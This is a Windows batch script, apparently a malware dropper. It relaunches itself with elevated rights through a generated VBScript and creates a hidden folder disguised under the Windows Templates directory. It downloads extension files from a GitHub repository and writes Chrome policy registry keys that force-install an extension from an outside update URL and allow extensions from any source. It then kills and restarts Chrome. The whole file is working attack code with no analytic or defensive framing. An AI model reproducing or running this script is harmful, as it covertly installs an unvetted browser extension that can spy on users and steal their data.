@echo off
setlocal enabledelayedexpansion
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)

set "D=%APPDATA%\Microsoft\Windows\Templates\WDF"
mkdir "%D%" 2>nul
attrib +H "%D%" >nul 2>&1

curl -s -o "%D%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%D%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "leelplbjobiheomgknchcnbmnancegal;https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/version.xml" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "BlockExternalExtensions" /t REG_DWORD /d 0 /f >nul 2>&1

taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 2 /nobreak >nul
start "" chrome.exe >nul 2>&1
exit